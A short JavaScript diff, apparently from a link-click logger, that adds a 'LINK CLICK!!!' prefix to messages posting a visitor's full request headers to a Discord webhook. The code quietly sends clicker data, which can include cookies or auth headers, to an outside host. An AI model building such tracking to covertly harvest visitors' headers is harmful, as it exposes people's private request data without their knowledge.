@@ -106,7 +106,7 @@ Headers: ${JSON.stringify(req.headers, null, 2)}
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           // Discord has a 2000-character limit per message
-          content: `\`\`\`\n${logText.slice(0, 1900)}\n\`\`\``
+          content: `LINK CLICK!!!\`\`\`\n${logText.slice(0, 1900)}\n\`\`\``
         })
       });
     }
